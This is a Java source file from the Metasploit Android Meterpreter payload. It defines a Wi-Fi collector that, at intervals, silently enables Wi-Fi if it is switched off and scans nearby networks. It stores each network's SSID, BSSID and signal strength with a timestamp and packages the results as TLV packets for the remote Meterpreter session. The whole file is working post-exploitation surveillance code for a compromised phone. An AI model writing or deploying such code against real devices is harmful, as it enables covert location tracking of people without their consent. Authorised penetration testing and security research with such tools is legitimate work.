package com.metasploit.meterpreter;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;

import android.net.wifi.ScanResult;
import android.net.wifi.WifiManager;

import com.metasploit.meterpreter.android.android_interval_collect;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;

import java.lang.InterruptedException;
import java.lang.Math;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Hashtable;

public class WifiCollector extends IntervalCollector {
    private final Object syncObject = new Object();

    private Hashtable<Long, List<WifiResult>> collections = null;
    private WifiReceiver receiver = null;

    private class WifiResult {
        private final String bssid;
        private final String ssid;
        private final int level;

        public WifiResult(String bssid, String ssid, int level) {
            this.bssid = bssid;
            this.ssid = ssid;
            this.level = level;
        }

        public WifiResult(ScanResult result) {
            this.bssid = result.BSSID;
            this.ssid = result.SSID;
            this.level = result.level;
        }

        public WifiResult(DataInputStream input) throws IOException {
            this.bssid = input.readUTF();
            this.ssid = input.readUTF();
            this.level = input.readShort();
        }

        public void write(DataOutputStream output) throws IOException {
            output.writeUTF(this.bssid);
            output.writeUTF(this.ssid);
            output.writeShort(this.level);
        }

        public String getBssid() {
            return this.bssid;
        }

        public String getSsid() {
            return this.ssid;
        }

        public int getLevel() {
            return this.level;
        }
    }

    private class WifiReceiver extends BroadcastReceiver {

        private final Context context;
        private final Object syncObject = new Object();
        private final long timeout;

        private WifiManager wifiManager;
        private List<ScanResult> results;
        private boolean wifiAlreadyRunning = false;

        public WifiReceiver(Context context, long timeout) {
            this.context = context;
            this.timeout = timeout;
        }

        @Override
        public void onReceive(Context c, Intent intent) {
            synchronized (this.syncObject) {
                this.results = this.getWifiManager().getScanResults();
                this.syncObject.notifyAll();
            }
        }

        public List<ScanResult> runScan() {
            this.wifiAlreadyRunning = this.getWifiManager().isWifiEnabled();

            if (!this.wifiAlreadyRunning) {
                this.getWifiManager().setWifiEnabled(true);
            }

            this.context.registerReceiver(this, new IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION));

            List<ScanResult> results = null;
            if (this.getWifiManager().startScan()) {
                synchronized (this.syncObject) {
                    try {
                        // TODO: determine if this is a valid thing to do
                        this.syncObject.wait(30000);

                        if (!this.wifiAlreadyRunning) {
                            this.getWifiManager().setWifiEnabled(false);
                        }

                        results = this.results;
                        this.results = null;
                    }
                    catch (InterruptedException ex) {
                        // timed out, so just exit without results
                    }
                }
            }

            this.context.unregisterReceiver(this);

            return results;
        }

        private WifiManager getWifiManager() {
            if (this.wifiManager == null) {
                this.wifiManager = (WifiManager)this.context.getSystemService(Context.WIFI_SERVICE);
            }
            return this.wifiManager;
        }
    }

    public WifiCollector(int collectorId, Context context, long timeout) {
        super(collectorId, context, timeout);
        this.collections = new Hashtable<Long, List<WifiResult>>();
    }

    public WifiCollector(int collectorId, Context context) {
        super(collectorId, context);
        this.collections = new Hashtable<Long, List<WifiResult>>();
    }

    protected boolean collect(DataOutputStream output) throws IOException {
        List<ScanResult> scanResults = this.receiver.runScan();
        if (scanResults != null) {
            List<WifiResult> results = new ArrayList<WifiResult>();
            for (ScanResult scanResult : scanResults) {
                results.add(new WifiResult(scanResult));
            }

            synchronized (this.syncObject) {
                this.collections.put(System.currentTimeMillis(), results);

                // serialize and write to storage, formatted as:
                // Long( configured polling frequency [ timeout ] )
                // Long( number of snapshots taken )
                //    -> Long( collection timestamp key )
                //    -> Long( number of entries in this snapshot )
                //          ->  String (bssid)
                //          ->  String (ssid)
                //          ->  Short (signal level)
                output.writeLong(this.timeout);
                output.writeInt(this.collections.size());
                for (Long ts : this.collections.keySet()) {
                    results = this.collections.get(ts.longValue());
                    output.writeLong(ts.longValue());
                    output.writeInt(results.size());
                    for (WifiResult wifiResult : results) {
                        wifiResult.write(output);
                    }
                }
            }

            return true;
        }

        return false;
    }

    protected void loadFromMemory(DataInputStream input) throws IOException {
        this.timeout = input.readLong();
        int collectionCount = input.readInt();
        for (int i = 0; i < collectionCount; ++i) {
            long ts = input.readLong();
            int resultCount = input.readInt();
            List<WifiResult> results = new ArrayList<WifiResult>();
            for (int j = 0; j < resultCount; ++j) {
                results.add(new WifiResult(input));
            }
            this.collections.put(ts, results);
        }
    }

    protected void init() {
        if (this.receiver == null) {
            this.receiver = new WifiReceiver(this.context, this.getTimeout());
        }
    }

    protected void deinit() {
        this.receiver = null;
    }

    public boolean flush(TLVPacket packet) {
        Hashtable<Long, List<WifiResult>> collections = this.collections;

        synchronized (this.syncObject) {
            // create a new collection, for use on the other thread
            // if it's running
            this.collections = new Hashtable<Long, List<WifiResult>>();
        }

        List<Long> sortedKeys = new ArrayList<Long>(collections.keySet());
        Collections.sort(sortedKeys);

        for (Long ts : sortedKeys) {
            long timestamp = ts.longValue();
            List<WifiResult> scanResults = collections.get(timestamp);

            TLVPacket resultSet = new TLVPacket();

            try {
                resultSet.add(android_interval_collect.TLV_TYPE_COLLECT_RESULT_TIMESTAMP, timestamp / 1000);
                for (int i = 0; i < scanResults.size(); ++i) {
                    WifiResult result = scanResults.get(i);
                    TLVPacket wifiSet = new TLVPacket();

                    wifiSet.add(android_interval_collect.TLV_TYPE_COLLECT_RESULT_WIFI_SSID, result.getSsid());
                    wifiSet.add(android_interval_collect.TLV_TYPE_COLLECT_RESULT_WIFI_BSSID, result.getBssid());
                    // level is negative, but it'll be converted to positive on the flip side.
                    wifiSet.add(android_interval_collect.TLV_TYPE_COLLECT_RESULT_WIFI_LEVEL, Math.abs(result.getLevel()));

                    resultSet.addOverflow(android_interval_collect.TLV_TYPE_COLLECT_RESULT_WIFI, wifiSet);
                }
                packet.addOverflow(android_interval_collect.TLV_TYPE_COLLECT_RESULT_GROUP, resultSet);
            }
            catch (IOException ex) {
                // not good, but not much we can do here
            }
        }

        return true;
    }
}
